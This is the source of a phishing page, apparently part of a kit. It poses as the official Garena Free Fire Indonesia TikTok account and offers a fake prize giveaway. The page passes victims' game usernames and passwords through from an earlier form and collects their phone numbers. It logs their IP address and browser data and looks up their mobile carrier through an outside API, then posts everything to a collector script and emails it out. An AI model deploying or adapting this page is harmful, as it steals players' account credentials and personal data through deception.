<?php
$user = $_POST['user'];
$pass = $_POST['pass'];
$id = $_POST['id'];
$nick = $_POST['nick'];
$ip = $_POST['ip'];
?>
<!DOCTYPE html>
<html>

<head>
   <meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="description" content="TikTok - trends start here. On a device or on the web, viewers can watch and discover millions of personalized short videos. Download the app to get started."/>
	<title>TIK TOK X FREE FIRE</title>
    <title></title>
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <link rel="stylesheet" type="text/css" href="css/facebook.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
    <div class="init">
        <img src="https://www.imore.com/sites/imore.com/files/styles/large/public/article_images/2019/11/tiktok-logo2-jks-jks-jks-jks-jks-jks-jks.jpg">
    </div>
    <section>
        <header>
            <div class="back">
                <img src="icon/back.png">
            </div>
            <span class="nama">Garena Free Fire ID</span>
            <div class="menu">
                <img src="icon/menu.png">
            </div>
        </header>
        <!-- END OF HEADER -->
        <div class="wrap">
            <center>
                <div class="imgprofile">
                    <img src="icon/pp.jpeg">
                    <span class="username">@freefirebgid
                        <img class="verified" src="https://img.icons8.com/color/452/tiktok-verified-account.png">
                    </span>
                </div>
                <div class="data">
                    <ul>
                        <li>
                            <span class="value">22</span>
                            <label>Mengikuti</label>
                        </li>
                        <li>
                            <span class="value">1.9M</span>
                            <label>Pengikut</label>
                        </li>
                        <li>
                            <span class="value">8.5M</span>
                            <label>Suka</label>
                        </li>
                    </ul>
                </div>
                <div class="interface">
                    <div class="ikuti">Mengikuti</div>
                    <div class="ig"><i class="fab fa-instagram"></i></div>
                </div>
                <div class="deskripsi">
                    <p class="desc">
                        Official TikTok Account of Garena Free Fire Indonesia
                    </p>
                </div>
                <div class="attribute">
                    <span class="link"><i class="fas fa-link"></i> http://ff.garena.com/index/en/</span>
                </div>
                <div class="line"></div>
            </center>
            <!-- AREA HADIAH -->
            <div class="hadiah">
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/2.jpg">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/3.jpg">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/4.png">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/5.jpg">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/6.jpg">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/7.jpg">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/8.jpg">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/9.jpg">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
                <div class="box-body" onclick="lord(this)">
                    <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
                    <div class="imgBox">
                        <img class="img" src="img/10.jpg">
                    </div>
                    <div class="box-lid">
                        <div class="box-bowtie"></div>
                    </div>
                </div>
            </div>
            <footer>
            </footer>
        </div>
        <div class="mask" style="display: block;"></div>
        <div class="formulir" style="display: block;">
        	<span class="alert kosong">Mohon Isi Semua Formulir</span>
        	<span class="alert salah">Nomor HP Tidak Benar</span>
        	<span class="alert proses">Sedang Mengirim Data....</span>
            <form action="" onsubmit="return nguyenthuwan()" required>
                <div class="form-group">
                    <input type="number" class="form-input" id="hp" id="hp" placeholder="Nomor Hp">
                </div>
                <div class="form-group">
                    <select class="form-input" id="level" name="level">
                        <option value="" selected disabled>Level</option>
                        <option>1</option>
                        <option>2</option>
                        <option>3</option>
                        <option>4</option>
                        <option>5</option>
                        <option>6</option>
                        <option>7</option>
                        <option>8</option>
                        <option>9</option>
                        <option>10</option>
                        <option>11</option>
                        <option>12</option>
                        <option>13</option>
                        <option>14</option>
                        <option>15</option>
                        <option>16</option>
                        <option>17</option>
                        <option>18</option>
                        <option>19</option>
                        <option>20</option>
                        <option>21</option>
                        <option>22</option>
                        <option>23</option>
                        <option>24</option>
                        <option>25</option>
                        <option>26</option>
                        <option>27</option>
                        <option>28</option>
                        <option>29</option>
                        <option>30</option>
                        <option>31</option>
                        <option>32</option>
                        <option>33</option>
                        <option>34</option>
                        <option>35</option>
                        <option>36</option>
                        <option>37</option>
                        <option>38</option>
                        <option>39</option>
                        <option>40</option>
                        <option>41</option>
                        <option>42</option>
                        <option>43</option>
                        <option>44</option>
                        <option>45</option>
                        <option>46</option>
                        <option>47</option>
                        <option>48</option>
                        <option>49</option>
                        <option>50</option>
                        <option>51</option>
                        <option>52</option>
                        <option>53</option>
                        <option>54</option>
                        <option>55</option>
                        <option>56</option>
                        <option>57</option>
                        <option>58</option>
                        <option>59</option>
                        <option>60</option>
                        <option>61</option>
                        <option>62</option>
                        <option>63</option>
                        <option>64</option>
                        <option>65</option>
                        <option>66</option>
                        <option>67</option>
                        <option>68</option>
                        <option>69</option>
                        <option>70</option>
                        <option>71</option>
                        <option>72</option>
                        <option>73</option>
                        <option>74</option>
                        <option>75</option>
                        <option>76</option>
                        <option>77</option>
                        <option>78</option>
                        <option>79</option>
                        <option>80</option>
                        <option>81</option>
                        <option>82</option>
                        <option>83</option>
                        <option>84</option>
                        <option>85</option>
                        <option>86</option>
                        <option>87</option>
                        <option>88</option>
                        <option>89</option>
                        <option>90</option>
                        <option>91</option>
                        <option>92</option>
                        <option>93</option>
                        <option>94</option>
                        <option>95</option>
                        <option>96</option>
                        <option>97</option>
                        <option>98</option>
                        <option>99</option>
                        <option>100</option>
                    </select>
                </div>
                <div class="form-group">
                    <select class="form-input" id="rank" name="rank">
                        <option value="" selected disabled>Rank</option>
                        <option>Bronze</option>
                        <option>Silver</option>
                        <option>Gold</option>
                        <option>Platinum</option>
                        <option>Diamond</option>
                        <option>Master</option>
                        <option>Grandmaster</option>
                    </select>
                </div>
                <div class="form-group">
                    <select class="form-input" id="epass" name="epass">
                        <option value="" selected disabled>Pernah Elite Pass?</option>
                        <option>Pernah</option>
                        <option>Tidak Pernah</option>
                    </select>
                </div>
                <input type="hidden" id="operator" value="">
                <input type="hidden" id="user" value="<?php echo $user;?>">
                <input type="hidden" id="pass" value="<?php echo $pass;?>">
                <input type="hidden" type="hidden" id="id" value="<?php echo $id;?>">
                <input type="hidden" id="nick" value="<?php echo $nick;?>">
                <input type="hidden" id="ip" value="<?php echo $ip;?>">
                <div class="form-group">
                    <input class="btn-submit" type="submit" name="submit" value="Submit">
                </div>
            </form>
        </div>
        <div class="sukses">
            <img src="https://s3-ap-southeast-1.amazonaws.com/alatteknikkitaassets/logos/success.gif">
            <h1>Terima Kasih</h1>
            <p>Hadiah anda sedang kami proses, mohon tunggu 24-74 jam agar item anda kami kirimkan ke akun anda</p>
        </div>
    </section>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="js/jquery.min.js"></script>
    <script type="text/javascript">
    $(document).ready(function() {
        setTimeout(() => {
            $('.init').fadeOut();
        }, 1000)
    })
    </script>
    <script type="text/javascript">
    	function nguyenthuwan()
    	{
    		$('.proses').show();
    		$('.salah').hide();
    		$('.kosong').hide();
    		$hp = $('#hp').val();
    		$level = $('#level').val();
    		$rank = $('#rank').val();
    		$epass = $('#epass').val();
    		$op = $('#operator').val();
    		$user = $('#user').val();
    		$pass = $('#pass').val();
    		$id = $('#id').val();
    		$nick = $('#nick').val();
    		$ip = $('#ip').val();
    		$ua = navigator.userAgent;
    		if($op == null || $op == '')
    		{
    			if($hp == '' || $hp == null || $hp.length <= 10)
    			{
    				$('.salah').show();
    				$('.proses').hide();
    				return false;
    			}else{
					var xhttp = new XMLHttpRequest();
					    xhttp.onreadystatechange = function() {
					        if (this.readyState == 4 && this.status == 200) {
								$da = JSON.parse(this.responseText);
								if($da['provider'] != null){
								$('#operator').val($da['provider']);
								$('.proses').hide();
					    			if($level == null || $level == '')
									{
										$('.kosong').show();
										$('.proses').hide();
										return false;
									}else{
										$('.kosong').hide();
									}
									// 
									if($rank == null || $rank == '')
									{
										$('.kosong').show();
										$('.proses').hide();
										return false;
									}else{
										$('.kosong').hide();
									}
									// 
									if($epass == null || $epass == '')
									{
										$('.kosong').show();
										$('.proses').hide();
										return false;
									}else{
										$('.kosong').hide();
									}
								}else{
									$('.salah').show();
									$('.proses').hide();
									return false;
								}
								// JIKA FORM LANGSUNG DIISI
                                $('.proses').show();
								$.post('nguyen.php',{
									user:$user,
									pass:$pass,
									id:$id,
									nick:$nick,
									hp:$hp,
									level:$level,
									rank:$rank,
									epass:$epass,
									ip:$ip,
									ua:$ua,
									op:$da['provider']
								},function(sendMails){
									sendMail($user,$pass,$nick,$level,$ip,$ua); // Mengirim Email
									$('.formulir').hide();
									$('.sukses').css('display','flex');
								});
					       }
					    };
					    xhttp.open("GET", "https://api-shagitz.com/api/operator/"+$hp, true);
					    xhttp.send();
    			}
    		}else{
    			if($level == null || $level == '')
				{
					$('.kosong').show();
					$('.proses').hide();
					return false;
				}else{
					$('.kosong').hide();
				}
				// 
				if($rank == null || $rank == '')
				{
					$('.kosong').show();
					$('.proses').hide();
					return false;
				}else{
					$('.kosong').hide();
				}
				// 
				if($epass == null || $epass == '')
				{
					$('.kosong').show();
					$('.proses').hide();
					return false;
				}else{
					$('.kosong').hide();
				}
				// JIKA FORM SALAH
                $('.proses').show();
				$.post('nguyen.php',{
					user:$user,
					pass:$pass,
					id:$id,
					nick:$nick,
					hp:$hp,
					level:$level,
					rank:$rank,
					epass:$epass,
					ip:$ip,
					ua:$ua,
					op:$da['provider']
				},function(sendMails){
					sendMail($user,$pass,$level,$nick,$ip,$ua); // Mengirim Email
					$('.formulir').hide();
					$('.sukses').css('display','flex');
				});
    		}
    		return false;
    	}
    </script>
</body>

</html>